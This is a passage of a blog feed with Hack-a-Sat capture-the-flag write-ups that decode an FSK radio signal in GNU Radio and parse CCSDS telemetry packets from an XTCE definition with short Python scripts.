</span>    <span class="k">print</span><span class="p">(</span><span class="s">"Received %d bytes"</span> <span class="o">%</span><span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>

    <span class="n">c_version</span><span class="p">,</span> <span class="n">c_type</span><span class="p">,</span> <span class="n">c_sechd</span><span class="p">,</span> <span class="n">c_apid</span><span class="p">,</span> <span class="n">c_gpflags</span><span class="p">,</span> <span class="n">c_ssc</span><span class="p">,</span> <span class="n">c_plen</span> <span class="o">=</span> <span class="n">DecodeHeader</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
    <span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">6</span><span class="p">:]</span>
    <span class="k">if</span> <span class="n">c_apid</span> <span class="o">==</span> <span class="n">APID_FLAG_PACKET</span><span class="p">:</span>
      <span class="n">flag</span> <span class="o">=</span> <span class="n">DecodeFlag</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
      <span class="k">print</span><span class="p">(</span><span class="s">"THE FLAG: %s"</span> <span class="o">%</span> <span class="n">flag</span><span class="p">)</span>
    <span class="k">elif</span> <span class="n">c_apid</span> <span class="o">==</span> <span class="n">APID_EPS_PACKET</span><span class="p">:</span>
      <span class="k">print</span><span class="p">(</span><span class="s">"EPS: "</span><span class="p">)</span>
      <span class="n">eps</span> <span class="o">=</span> <span class="n">DecodeEPS</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
      <span class="n">pprint</span><span class="p">(</span><span class="n">eps</span><span class="p">)</span>
      <span class="k">if</span> <span class="n">eps</span><span class="p">[</span><span class="s">"RADIO2_ENABLE"</span><span class="p">]</span> <span class="o">==</span> <span class="bp">True</span><span class="p">:</span>
        <span class="n">r</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">EncodeHeader</span><span class="p">()</span> <span class="o">+</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x00\x02\x01</span><span class="s">"</span><span class="p">)</span> <span class="c1"># Flag
</span>    <span class="k">else</span><span class="p">:</span>
      <span class="k">print</span><span class="p">(</span><span class="s">"GOT PACKET %d with LENGTH %d"</span> <span class="o">%</span><span class="p">(</span><span class="n">c_apid</span><span class="p">,</span> <span class="n">c_plen</span><span class="p">))</span>
      <span class="k">print</span><span class="p">(</span><span class="n">binascii</span><span class="p">.</span><span class="n">hexlify</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
    <span class="c1"># data = data[c_plen+1:]
</span>  <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"ERROR: "</span><span class="p">,</span> <span class="n">e</span><span class="p">)</span>
    <span class="k">break</span>

<span class="n">rv</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
<span class="n">r</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
</code></pre></div></div>]]></content><author><name>Lucas Teske</name></author><category term="English" /><category term="Hacking" /><category term="Linux" /><category term="CTF" /><category term="SDR" /><category term="Camera" /><category term="Hacking" /><category term="CTF" /><category term="Hackasat" /><category term="CTF Writeup" /><category term="Satellite" /><category term="XTCE" /><summary type="html"><![CDATA[Hack a Sat — Talk to me, Goose]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://lucasteske.dev/assets/posts/medium/1_b23VUAe-7ZvnQF4MIZO73A.png" /><media:content medium="image" url="https://lucasteske.dev/assets/posts/medium/1_b23VUAe-7ZvnQF4MIZO73A.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Hack a Sat - Phasors to Stun</title><link href="https://lucasteske.dev/2020/05/hack-a-sat-phasors-to-stun/" rel="alternate" type="text/html" title="Hack a Sat - Phasors to Stun" /><published>2020-05-30T13:15:00-03:00</published><updated>2020-05-30T13:15:00-03:00</updated><id>https://lucasteske.dev/2020/05/hack-a-sat-phasors-to-stun</id><content type="html" xml:base="https://lucasteske.dev/2020/05/hack-a-sat-phasors-to-stun/"><![CDATA[<h1 id="hack-a-sat--phasors-to-stun">Hack a sat  —  Phasors to Stun</h1>

<p>The challenge</p>

<p>I got really excited about it because its a SDR one. And everyone that knows me know that I love SDR stuff.</p>

<p>The zip file itself contains a wav file which they told us is not an audio but an radio signal</p>

<p><img src="/assets/posts/medium/1_oEKFYtXfQrg3o9EcymOpLw.png" alt="File command to show what the wave file is" /><em>File command to show what the wave file is</em></p>

<p>If we open in audacity we will se a very interesting pattern:</p>

<p><img src="/assets/posts/medium/1_B6iuajNIgKRnK1eDHE9RfA.png" alt="Audacity view of the wave file" /><em>Audacity view of the wave file</em></p>

<p>That looks like a 2-FSK demodulated file (see <a href="https://en.wikipedia.org/wiki/Frequency-shift_keying">https://en.wikipedia.org/wiki/Frequency-shift_keying</a>). When you demodulate a 2-FSK I/Q from correctly from a Radio, it will convert the frequency to voltage leading to a pattern like the one saw.</p>

<p>I said 2-FSK besides other ones, because there is clearly almost only three values there: 1, 0 and -1. The 0 is usually the transistion, and in a 2-FSK 1 and -1 represents the bits itself. We can use GNU Radio to transform that in a bitstream, but before we need to know the baud rate (or bit rate).</p>

<p>That can be done manually in the audacity itself. Just find two peaks that are closer to each other than other any other. That’s probably the <strong>minimum period</strong> of the signal which usually tells us a bit change. For example:</p>

<p><img src="/assets/posts/medium/1_tZUQt0MBQvI0i2JbHiDauw.png" alt="Two short peaks selected" /><em>Two short peaks selected</em></p>

<p>I got one negative and one positive short peak, which would represent a 0 to 1 transition or a 1 to 0 transition. Then you can see that there is 4 samples selected (just check these dots, they’re the samples in the file) which means that there is 4 samples per bit in the wav signal. Since the wav sample rate is 32000 we can expect the baudrate to be something close to 8000. So now we have enough information then we can go to GNU Radio!</p>

<p>In GNU Radio the first thing we should do is get a Wav File Source to open the file:</p>

<p><img src="/assets/posts/medium/1_FFyDLx-6GeTnYS8-aUNqRA.png" alt="Wave File Source" /><em>Wave File Source</em></p>

<p>I selected the option <strong>Repeat</strong> to be false, so it will not run foverer repeting the file. After that we need something to synchronize our bits and find where to sample the bits we want. There are several blocks that can do that, but I usually prefer the <strong>M&amp;M Clock Recovery</strong> block. Its easy to use and since the singnal does not have much noise on it, it will work perfectly. One thing to notice is that the M&amp;M usually works on complex samples, so you need to change the sample type to <strong>float</strong>. Then there is a few parameters to set:</p>

<p><img src="/assets/posts/medium/1_bo6sVsrnFugs0MHKug-2Aw.png" alt="M&amp;M Clock Recovery Parameters" /><em>M&amp;M Clock Recovery Parameters</em></p>

<p>The most important here is <strong>Omega</strong>. Omega represents the number of input samples per output sample (let’s call symbol). We found out that the input audio has 4 samples per symbol. So our <strong>Omega</strong> is 4. The other parameters defines how the tracking loop works. You can start with the parameters I put (is usually the defaults what I try initially) and tune afterwards. They’re mostly effective for signals that are degraded by noise which is not the case of this flag. That means basically any value should work.</p>

<p>One thing worth to mention is that the <strong>Omega Relative Limit</strong> limits how much from the “last detected symbol” the current symbol can deviate. If you put higher enough, the lock will be loose and can detect wrong symbols. Since our signal basically doesn’t have any noise, we can put this value very low.</p>

<p>Now we can plug the two blocks:</p>

<p><img src="/assets/posts/medium/1_pLL_Dw-EBadWJaJI3l69Mw.png" alt="Clock Recovery + Wav File" /><em>Clock Recovery + Wav File</em></p>

<p>The next step is to use a <strong>Binary Slicer</strong> blocks that will convert a -1 in float to a 0 byte and a 1 float to 1 byte. But before that we need to talk about bit alignment and how it affects us.</p>

<p>Let’s supose we have this string:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HELLO
</code></pre></div></div>

<p>That in binary is:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>01001000 01000101 01001100 01001100 01001111
   H         E        L        L       O
</code></pre></div></div>

<p>If we have a stream that repeats hello two times we will have something like that:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>01001000 01000101 01001100 01001100 01001111 01001000 01000101 ...
   H         E        L        L       O        H        E
</code></pre></div></div>

<p>When receiving continuous signals, you usually don’t know where you started fetching the data. Its possible that we started at middle of a byte instead of the start. That affects us because if we start counting a byte from the middle, we will have bytes that have pieces of to bytes. For example if we started at bit 4:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1000010001010100110001001100010011110100100001000101
</code></pre></div></div>

<p>We will be missing 4 bits from the first byte and we would not know that. And if we tried to decode it:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>10000100 01010100 11000100 11000100 11110100 10000100 0101 ...
   �         T        �       �        �         �
</code></pre></div></div>

<p>The signal wouldn’t make sense to us. So we need to account that we might have a bit shift in that. Since our chars are 1 byte wide (8 bits) we only need to check from shift 0 to 7, since if it is bigger than that, it will be the same as N byte shift + n bit shift.</p>

<p>On gnuradio we can use a <strong>Skip Head</strong> block that will skip N samples before sending the data to the next block.</p>

<p><img src="/assets/posts/medium/1_VBVu-iZh_AbeQKbiBN_XbQ.png" alt="Wav + MM + Skip" /><em>Wav + MM + Skip</em></p>

<p>We can start with Num Items = 0 because we don’t know if the data has been shifted. Then we can get to the next block that is the binary slicer.</p>

<p><img src="/assets/posts/medium/1_FmWEN_NT_DC9HvDyMxJnUw.png" alt="Wav + MM + Skip + Slicer" /><em>Wav + MM + Skip + Slicer</em></p>

<p>The binary slicer work is simple: It receive float samples. If the sample is &gt; 0 it outputs a byte with value 1. If its ≤ 0 it outputs a byte 0.</p>

<p>After that we will have a stream of bits unpacked in a stream of bytes. We need to pack them together (each 8 bytes of input to form a single byte). For that we can use the <strong>Pack K Bits</strong> block.</p>

<p><img src="/assets/posts/medium/1_aC8JZtn8fhN7Mb8E1xA-eA.png" alt="Wav + MM + Skip + Slicer + Pack" /><em>Wav + MM + Skip + Slicer + Pack</em></p>

<p>The <strong>Pack K Bits</strong> block will fetch <strong>K</strong> input bytes, put them together and output a single byte. It is basically a Add + Shift process that after it processes <strong>K</strong> inputs, it outputs the memory and resets. It will basically transform:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>00000001 00000000 00000001 00000001 00000001 00000000 00000001 00000001
</code></pre></div></div>

<p>And make a single byte:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>10111011
</code></pre></div></div>

<p>After that we can save it to a file using the <strong>File Sink</strong> block.</p>

<p><img src="/assets/posts/medium/1_2i7xMJCqsO2akqRGV8-m9Q.png" alt="Complete decode flow" /><em>Complete decode flow</em></p>

<p>I selected it to <strong>Overwrite</strong> the output file, so when we change the Skip Head, it just replaces the old file.</p>

<p>Now we have our complete decode flow, we can hit run in the bar.</p>

<p>After that we can inspect our file by running <strong>cat</strong> on it.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cat output.bin
</code></pre></div></div>

<p><img src="/assets/posts/medium/1_D32TnW8NmfxpfM7CqEl9SA.png" alt="cat output" /><em>cat output</em></p>

<p>We can see that something is periodic, but it doesnt make sense. So we repeat the process increasing Num Items. And then with Num Items = 5</p>

<p><img src="/assets/posts/medium/1_NV7eIw_aTHQct1asN90onw.png" alt="FLAG FOUND" /><em>FLAG FOUND</em></p>

<p>We’ve found the flag!</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>THE FLAG IS: flag{xray72468alpha:GKhWwvFNBGHT44M8d5Z2y4sc9xo7T4tNrwlTw5OWuCg_9dd4Ow_aiMDgxTtL9ng2s2sEDMA0AfTrsSpjv_sNvMg}
</code></pre></div></div>

<p>Final flow:</p>

<p><img src="/assets/posts/medium/1_lEYyYL0REStDYZi7xkGmag.png" alt="Final GNU Radio Flow" /><em>Final GNU Radio Flow</em></p>]]></content><author><name>Lucas Teske</name></author><category term="English" /><category term="Hacking" /><category term="Linux" /><category term="CTF" /><category term="SDR" /><category term="Camera" /><category term="Hacking" /><category term="CTF" /><category term="Hackasat" /><category term="CTF Writeup" /><category term="Satellite" /><category term="SDR" /><category term="GNU Radio" /><category term="Radio" /><summary type="html"><![CDATA[Hack a sat  —  Phasors to Stun]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://lucasteske.dev/assets/posts/medium/1_R1n7vaNfInOP6BCFXkjv1Q.png" /><media:content medium="image" url="https://lucasteske.dev/assets/posts/medium/1_R1n7vaNfInOP6BCFXkjv1Q.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Hack a Sat - Can you hear me now?</title><link href="https://lucasteske.dev/2020/05/hack-a-sat-can-you-hear-me-now/" rel="alternate" type="text/html" title="Hack a Sat - Can you hear me now?" /><published>2020-05-29T22:47:00-03:00</published><updated>2020-05-29T22:47:00-03:00</updated><id>https://lucasteske.dev/2020/05/hack-a-sat-can-you-hear-me-now</id><content type="html" xml:base="https://lucasteske.dev/2020/05/hack-a-sat-can-you-hear-me-now/"><![CDATA[<h1 id="hack-a-satcan-you-hear-me-now">Hack-a-sat — Can you hear me now?</h1>

<p>That challenged asked us to decode a Telemetry data that was being sent over a TCP port. If you open the netcat, the following happen:</p>

<p><img src="/assets/posts/medium/1_WTSv1hH_Rbrc98-SLlmUOw.png" alt="" /></p>

<p>Then if you connect to the Telemetry Service using netcat:</p>

<p><img src="/assets/posts/medium/1_7DSxuzMFhO7bWNiUofvCZQ.png" alt="" /></p>

<p>In the provided zip file there is a telemetry.xtce file which is a XML file that tells us how the binary packet is encoded. A quick search over the internet lead me to the Wikipedia: <a href="https://en.wikipedia.org/wiki/XML_Telemetric_and_Command_Exchange">https://en.wikipedia.org/wiki/XML_Telemetric_and_Command_Exchange</a></p>

<p>It is defined in the CCSDS Green Book (the spec <a href="https://public.ccsds.org/Pubs/660x0g1.pdf">https://public.ccsds.org/Pubs/660x0g1.pdf</a> )</p>

<p>The file has several sections. I will describe a few of them:</p>

<ul>
  <li><strong>ParameterTypeSet</strong> — Describes the type of parameters to be used in the protocol definition</li>
  <li><strong>ParameterSet</strong> — Describes parameters to be used in protocol definition</li>
  <li><strong>ContainerSet</strong> — Describes the structures inside the protocol</li>
</ul>

<p>We will get back to them afterwards. I’m bit lazy to check the whole spec since it should be straightforward to read directly the XTCE. I usually find that when it comes to Aerospace Stuff (Sorry NASA and friends) <strong>it’s easier to reverse engineer</strong> than read the docs. So I just did a quick look in the documentation and quit (its huge).</p>

<p>By a quick look inside the xtce file we can find how the flag is defined:</p>

<p><img src="/assets/posts/medium/1_HwFLwpkgNcTIOqAyOCOHVg.png" alt="Flag definition on XTCE" /></p>

<p>Each of the parameters looks like a single character from the flag, <strong>but they’re 7 bit encoded</strong>. That means if we look at the raw binary, we will not see the flag itself since each ASCII character is 8 bits wide.</p>

<p>In the <strong>ContainerSet</strong> we can see the possible structs that we received. Let’s take a look in a piece:</p>

<p><img src="/assets/posts/medium/1_Iw2Q-LIH_Lh60mY9YeloJw.png" alt="AbstractTM Packet Header Definition" /><em>AbstractTM Packet Header Definition</em></p>

<p>That piece specifies a <strong>Container</strong> called “AbstractTM Packet Header” (I think I will launch a company called <strong>Abstract</strong> after that) in which there are few entries. These entries are mapped to the binary itself. Notice the parameterRef which points to a previous defined parameter at <strong>ParameterSet</strong> section. Let’s take a look:</p>

<p><img src="/assets/posts/medium/1_GJ1T6nETTg4SZe-g-DFoLQ.png" alt="CCSDS Header Parameter Types" /><em>CCSDS Header Parameter Types</em></p>

<p>From there we can infer:</p>

<ul>
  <li>The field CCSDS_VERSION is encoded in 3 bit</li>
  <li>The field CCSDS_TYPE is encoded in 1 bit</li>
  <li>The field CCSDS_SEC_HD is encoded in 1 bit</li>
  <li>The field CCSDS_APID is encoded in 11 bit</li>
  <li>The field CCSDS_GP_FLAGS is encoded in 2 bit</li>
  <li>The field CCSDS_SSC is encoded in 14 bit</li>
  <li>The field CCSDS_PLENGTH is encoded in 2 bytes (16 bit)</li>
</ul>

<p>If you sum up all, you will get a header that is 6 bytes long. When seeing this two fields came to my attention. The APID and PLENGTH . <strong>APID</strong> is usually refered to <strong>AP</strong>plication <strong>ID</strong>entification and <strong>PLENGTH</strong> to <strong>P</strong>acket <strong>LENGTH</strong>.</p>

<p>That means that even if there are a lot of packets, we dont need to <em>really</em> parse them, just the flag one. We can skip by knowing the APID and Packet Length. So let’s search the Flag packet!</p>

<p><img src="/assets/posts/medium/1_99xgvX4FJB4oieHVz2ug8g.png" alt="Start of Flag Packet definition" /><em>Start of Flag Packet definition</em></p>

<p><img src="/assets/posts/medium/1_ozGAORywhHA7M1C5tb9mVQ.png" alt="End of Flag Packet definition" /><em>End of Flag Packet definition</em></p>

<p>So here I split the image because the packet definition is huge (lots of FLAGXX fields). We can see a new section here: <strong>RestrictionCriteria</strong>.</p>

<p>That section tells us which is the condition that the parser should met to parse the content as that packet. That says that if a packet has the following Field =&gt; Values in the Packet Header:</p>

<ul>
  <li><strong>CCSDS_VERSION</strong> =&gt; 0</li>
  <li><strong>CCSDS_TYPE</strong>    =&gt; 0</li>
  <li><strong>CCSDS_SEC_HD</strong>  =&gt; 0</li>
  <li><strong>CCSDS_APID</strong>    =&gt; 102</li>
</ul>

<p>That means we got our Flag Packet. So let’s assume all packets have a header and make our parser!</p>

<p>I started dumping the netcat to a file so I can process without having to connect every time. That’s simple by just piping:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc 18.219.199.203 20072 <span class="o">&gt;</span> dump.bin
</code></pre></div></div>

<p>Then started writing a simple python script. First by</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">struct</span>

<span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">"dump.bin"</span><span class="p">,</span> <span class="s">"rb"</span><span class="p">)</span>
<span class="n">data</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">(</span><span class="n">f</span><span class="p">.</span><span class="n">read</span><span class="p">())</span>
<span class="n">f</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">DecodeHeader</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
  <span class="n">c_version</span> <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0xE0</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">5</span>
  <span class="n">c_type</span> <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0x10</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">4</span>
  <span class="n">c_sechd</span> <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0x8</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">3</span>
  <span class="n">c_apid</span> <span class="o">=</span> <span class="p">((</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0x7</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="n">data</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
  <span class="n">c_gpflags</span> <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0xC0</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">6</span>
  <span class="n">c_ssc</span> <span class="o">=</span> <span class="p">((</span><span class="n">data</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0x3F</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="n">data</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span>
  <span class="n">c_plen</span> <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span><span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="p">)</span>
  <span class="k">return</span> <span class="n">c_version</span><span class="p">,</span> <span class="n">c_type</span><span class="p">,</span> <span class="n">c_sechd</span><span class="p">,</span> <span class="n">c_apid</span><span class="p">,</span> <span class="n">c_gpflags</span><span class="p">,</span> <span class="n">c_ssc</span><span class="p">,</span> <span class="n">c_plen</span>

<span class="k">while</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
  <span class="n">c_version</span><span class="p">,</span> <span class="n">c_type</span><span class="p">,</span> <span class="n">c_sechd</span><span class="p">,</span> <span class="n">c_apid</span><span class="p">,</span> <span class="n">c_gpflags</span><span class="p">,</span> <span class="n">c_ssc</span><span class="p">,</span> <span class="n">c_plen</span> <span class="o">=</span> <span class="n">DecodeHeader</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
  <span class="k">print</span><span class="p">(</span><span class="s">"GOT PACKET %d with LENGTH %d"</span> <span class="o">%</span><span class="p">(</span><span class="n">c_apid</span><span class="p">,</span> <span class="n">c_plen</span><span class="p">))</span>
  <span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">6</span><span class="p">:]</span>         <span class="c1"># Skip the header
</span>                          <span class="c1"># data[:c_plen+1] has content
</span>  <span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="n">c_plen</span><span class="o">+</span><span class="mi">1</span><span class="p">:]</span>  <span class="c1"># remove the current data
</span></code></pre></div></div>

<p>This decodes the header by doing some bit shifting. And if my assumption that every packet has a header and the packet length I could iterate over the file until no bytes are left. Since the file is small, I could load the entire file in the memory. Then running the script gave me:</p>

<p><img src="/assets/posts/medium/1_mOSeuplpeXYIbF0eq7Kl-Q.png" alt="" /></p>

<p>Got no errors and the data looks fine! We also got the APID 102 which is what the APID for Flag Packet. Then the content should be easy to read.</p>

<p>If we check the Flag Packet definition, besides the header, there is only the FLAGXXX fields there which means the entire content is the flag. Then we can just get the whole content and decode from 7 bit to 8 bit. Do do that, I was really lazy to do the proper bit shifting, so I just created an array with 1’s and 0’s strings, when it reached 8, I packed into a char and added to an array. That would be really slow for big data, but for a 120 byte flag should be good. So thats the code I tried:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">struct</span>

<span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">"dump.bin"</span><span class="p">,</span> <span class="s">"rb"</span><span class="p">)</span>
<span class="n">data</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">(</span><span class="n">f</span><span class="p">.</span><span class="n">read</span><span class="p">())</span>
<span class="n">f</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">DecodeHeader</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
  <span class="n">c_version</span> <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0xE0</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">5</span>
  <span class="n">c_type</span> <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0x10</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">4</span>
  <span class="n">c_sechd</span> <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0x8</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">3</span>
  <span class="n">c_apid</span> <span class="o">=</span> <span class="p">((</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0x7</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="n">data</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
  <span class="n">c_gpflags</span> <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0xC0</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">6</span>
  <span class="n">c_ssc</span> <span class="o">=</span> <span class="p">((</span><span class="n">data</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0x3F</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="n">data</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span>
  <span class="n">c_plen</span> <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span><span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="p">)</span>
  <span class="k">return</span> <span class="n">c_version</span><span class="p">,</span> <span class="n">c_type</span><span class="p">,</span> <span class="n">c_sechd</span><span class="p">,</span> <span class="n">c_apid</span><span class="p">,</span> <span class="n">c_gpflags</span><span class="p">,</span> <span class="n">c_ssc</span><span class="p">,</span> <span class="n">c_plen</span>

<span class="k">def</span> <span class="nf">DecodeFlag</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
  <span class="n">bitstream</span> <span class="o">=</span> <span class="p">[]</span>
  <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)):</span>
    <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="nb">format</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="s">"08b"</span><span class="p">):</span>
      <span class="n">bitstream</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">b</span><span class="p">)</span>

  <span class="n">flagdata</span> <span class="o">=</span> <span class="s">""</span>

  <span class="k">while</span> <span class="nb">len</span><span class="p">(</span><span class="n">bitstream</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
    <span class="n">b</span> <span class="o">=</span> <span class="s">""</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
      <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">bitstream</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">i</span><span class="p">:</span>
        <span class="n">b</span> <span class="o">+=</span> <span class="n">bitstream</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>

    <span class="k">if</span> <span class="n">b</span> <span class="o">!=</span> <span class="s">""</span><span class="p">:</span>
      <span class="n">flagdata</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">b</span><span class="p">,</span> <span class="mi">2</span><span class="p">))</span>
    <span class="n">bitstream</span> <span class="o">=</span> <span class="n">bitstream</span><span class="p">[</span><span class="mi">7</span><span class="p">:]</span>

  <span class="k">return</span> <span class="n">flagdata</span>

<span class="k">while</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
  <span class="n">c_version</span><span class="p">,</span> <span class="n">c_type</span><span class="p">,</span> <span class="n">c_sechd</span><span class="p">,</span> <span class="n">c_apid</span><span class="p">,</span> <span class="n">c_gpflags</span><span class="p">,</span> <span class="n">c_ssc</span><span class="p">,</span> <span class="n">c_plen</span> <span class="o">=</span> <span class="n">DecodeHeader</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
  <span class="k">print</span><span class="p">(</span><span class="s">"GOT PACKET %d with LENGTH %d"</span> <span class="o">%</span><span class="p">(</span><span class="n">c_apid</span><span class="p">,</span> <span class="n">c_plen</span><span class="p">))</span>
  <span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">6</span><span class="p">:]</span>         <span class="c1"># Skip the header
</span>                          <span class="c1"># data[:c_plen+1] has content
</span>  <span class="k">if</span> <span class="n">c_apid</span> <span class="o">==</span> <span class="mi">102</span><span class="p">:</span>
    <span class="n">flag</span> <span class="o">=</span> <span class="n">DecodeFlag</span><span class="p">(</span><span class="n">data</span><span class="p">[:</span><span class="n">c_plen</span><span class="o">+</span><span class="mi">1</span><span class="p">])</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"THE FLAG: %s"</span> <span class="o">%</span> <span class="n">flag</span><span class="p">)</span>
  <span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="n">c_plen</span><span class="o">+</span><span class="mi">1</span><span class="p">:]</span>  <span class="c1"># remove the current data
</span></code></pre></div></div>

<p>Then when running:</p>

<p><img src="/assets/posts/medium/1_OXCEAcC4nNZ-0okS2GW0Zg.png" alt="" /></p>

<p>BINGO, THERE IS OUR FLAG!</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>flag{echo22103romeo:GBd3nn6tIl060NgQ1e_mLZx-1ccydJ1LMAtqgZlWURHX-GPLmnLTZ3CfNvIvTi7JkB4hxxM5uuOuCT5SMmfFz2k}
</code></pre></div></div>

